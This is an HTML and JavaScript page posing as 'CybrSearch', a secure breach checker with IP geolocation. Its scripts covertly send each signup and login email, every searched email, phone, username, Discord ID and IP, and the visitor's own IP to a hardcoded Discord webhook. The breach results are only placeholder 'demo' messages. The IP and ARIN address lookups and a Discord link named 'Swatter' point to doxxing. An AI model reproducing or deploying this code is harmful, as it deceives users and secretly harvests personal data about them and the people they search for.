<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CybrSearch - Secure Tool</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      background-color: #0d1117;
      color: #c9d1d9;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding-top: 60px;
    }
    .container {
      max-width: 700px;
    }
    .card {
      background-color: #161b22;
      border: none;
      border-radius: 1rem;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }
    .form-control {
      background-color: #0d1117;
      color: #c9d1d9;
      border: 1px solid #30363d;
    }
    .form-control::placeholder {
      color: #8b949e;
    }
    .btn-primary {
      background-color: #238636;
      border: none;
    }
    .result-box {
      background-color: #1c2128;
      border-left: 5px solid #30363d;
      padding: 1rem;
      border-radius: 0.5rem;
      margin-top: 0.5rem;
      white-space: pre-wrap;
    }
    .result-box.success { border-left-color: #2ea043; }
    .result-box.warning { border-left-color: #d29922; }
    .result-box.error { border-left-color: #f85149; }
    .discord-btn {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #5865F2;
      color: white;
      border: none;
      border-radius: 30px;
      padding: 10px 20px;
      font-weight: bold;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
  <div class="container text-center">
    <div id="authSection">
      <h1 class="mb-4">üîê Welcome to CybrSearch</h1>
      <div id="loginForm" class="card p-4 mb-3">
        <h4>Login</h4>
        <input id="loginEmail" type="email" placeholder="Email" class="form-control mb-2" />
        <input id="loginPass" type="password" placeholder="Password" class="form-control mb-2" />
        <button onclick="login()" class="btn btn-primary w-100">Login</button>
        <p class="mt-3">No account? <a href="#" onclick="toggleForms('signup')">Sign up here</a></p>
      </div>

      <div id="signupForm" class="card p-4 mb-3" style="display:none;">
        <h4>Sign Up</h4>
        <input id="signupEmail" type="email" placeholder="Email" class="form-control mb-2" />
        <input id="signupPass" type="password" placeholder="Password" class="form-control mb-2" />
        <button onclick="signup()" class="btn btn-success w-100">Sign Up</button>
        <p class="mt-3">Already have an account? <a href="#" onclick="toggleForms('login')">Log in</a></p>
      </div>
    </div>

    <div id="toolSection" style="display:none;">
      <h1 class="mb-4">üîç Advanced Breach Checker + Geo IP</h1>
      <button onclick="logout()" class="btn btn-danger mb-3 float-end">Logout</button>
      <form onsubmit="searchData(); return false;" class="card p-4">
        <input id="email" type="email" placeholder="üìß Enter email address" class="form-control mb-2">
        <input id="phone" type="text" placeholder="üì± Enter phone number" class="form-control mb-2">
        <input id="username" type="text" placeholder="üë§ Enter username" class="form-control mb-2">
        <input id="discord" type="text" placeholder="üí¨ Enter Discord ID" class="form-control mb-2">
        <input id="ip" type="text" placeholder="üåê Enter IP address" class="form-control mb-3">
        <button type="submit" class="btn btn-primary w-100">Search</button>
      </form>
      <div class="mt-5 text-start">
        <h4>üîé Search Results</h4>
        <div id="results"></div>
      </div>
    </div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1381059057875554375/UvXzkyggNeRKpdY_9TeMx52Uv7w2eb7hQNjYFljBg6r55HiFI1qDukIo2ebjXA7S2XKD";

    function sendWebhook(title, message) {
      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: title,
            description: message,
            color: 7506394,
            timestamp: new Date().toISOString()
          }]
        })
      }).catch(console.warn);
    }

    function toggleForms(show) {
      document.getElementById('loginForm').style.display = show === 'login' ? 'block' : 'none';
      document.getElementById('signupForm').style.display = show === 'signup' ? 'block' : 'none';
    }

    function signup() {
      const email = document.getElementById("signupEmail").value.trim();
      const password = document.getElementById("signupPass").value;
      const users = JSON.parse(localStorage.getItem("users") || "{}");
      if (users[email]) return alert("User already exists");
      users[email] = { password };
      localStorage.setItem("users", JSON.stringify(users));
      sendWebhook("üÜï New Signup", `Email: ${email}`);
      alert("Account created! Please login.");
      toggleForms('login');
    }

    function login() {
      const email = document.getElementById("loginEmail").value.trim();
      const password = document.getElementById("loginPass").value;
      const users = JSON.parse(localStorage.getItem("users") || "{}");
      if (users[email]?.password === password) {
        localStorage.setItem("authUser", email);
        sendWebhook("üîê Login", `User: ${email}`);
        showTool();
      } else {
        alert("Invalid credentials");
      }
    }

    function logout() {
      const email = localStorage.getItem("authUser");
      sendWebhook("üîí Logout", `User: ${email}`);
      localStorage.removeItem("authUser");
      showLogin();
    }

    function showTool() {
      document.getElementById("authSection").style.display = "none";
      document.getElementById("toolSection").style.display = "block";
    }

    function showLogin() {
      document.getElementById("authSection").style.display = "block";
      document.getElementById("toolSection").style.display = "none";
    }

    window.onload = () => {
      if (localStorage.getItem("authUser")) showTool();
      else showLogin();
    }

    function updateResult(type, msg, style) {
      const box = document.createElement("div");
      box.className = `result-box ${style}`;
      box.innerText = msg;
      document.getElementById("results").appendChild(box);
    }

    async function searchData() {
      document.getElementById("results").innerHTML = "";
      const email = document.getElementById("email").value.trim();
      const phone = document.getElementById("phone").value.trim();
      const username = document.getElementById("username").value.trim();
      const discord = document.getElementById("discord").value.trim();
      const ip = document.getElementById("ip").value.trim();

      if (!email) updateResult("email", "‚ö†Ô∏è No email entered.", "warning");
      else updateResult("email", `‚úÖ Email checked (demo): ${email}`, "success");

      if (!phone) updateResult("phone", "‚ÑπÔ∏è Phone check skipped.", "warning");
      else updateResult("phone", `‚úÖ Phone checked (demo): ${phone}`, "success");

      if (!username) updateResult("username", "‚ÑπÔ∏è Username check skipped.", "warning");
      else updateResult("username", `‚úÖ Username checked (demo): ${username}`, "success");

      if (!discord) updateResult("discord", "‚ÑπÔ∏è Discord ID check skipped.", "warning");
      else updateResult("discord", `‚úÖ Discord ID checked (demo): ${discord}`, "success");

      let visitorIP = "Unknown";
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        visitorIP = ipData.ip || "Unknown";
      } catch {}

      sendWebhook("üîç Breach Search Attempt", `
        Email: ${email || 'N/A'}
        Phone: ${phone || 'N/A'}
        Username: ${username || 'N/A'}
        Discord: ${discord || 'N/A'}
        User IP: ${ip || 'N/A'}
        Visitor IP: ${visitorIP}
      `);

      if (ip) {
        try {
          const res = await fetch(`https://ipwho.is/${ip}`);
          const data = await res.json();
          if (data.success) {
            updateResult("ipgeo", `üåê IP Geo Info:\nIP: ${ip}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nISP: ${data.connection?.isp || 'N/A'}\nOrg: ${data.connection?.org || 'N/A'}`, "success");
          } else {
            updateResult("ipgeo", `‚ö†Ô∏è Geo lookup failed: ${data.message}`, "warning");
          }
        } catch {
          updateResult("ipgeo", `‚ùå Error fetching Geo IP data.`, "error");
        }

        try {
          const rdapRes = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
          const rdap = await rdapRes.json();
          const handle = rdap.handle || 'N/A';
          const network = rdap.name || 'N/A';
          const startAddress = rdap.startAddress || 'N/A';
          const endAddress = rdap.endAddress || 'N/A';
          const orgName = rdap.entities?.[0]?.vcardArray?.[1]?.find(x => x[0] === 'fn')?.[3] || 'N/A';
          const addressParts = rdap.entities?.[0]?.vcardArray?.[1]?.find(x => x[0] === 'adr')?.[3] || [];
          const address = addressParts.filter(Boolean).join(', ') || 'N/A';

          updateResult("arin", `üåê ARIN Info:\nHandle: ${handle}\nNet Name: ${network}\nStart: ${startAddress}\nEnd: ${endAddress}\nOrg: ${orgName}\nAddress: ${address}`, "success");
        } catch {
          updateResult("arin", `‚ùå Error fetching ARIN RDAP data.`, "error");
        }
      } else {
        updateResult("ip", "‚ÑπÔ∏è IP geo-location check skipped.", "warning");
      }
    }
  </script>
</body>
</html>
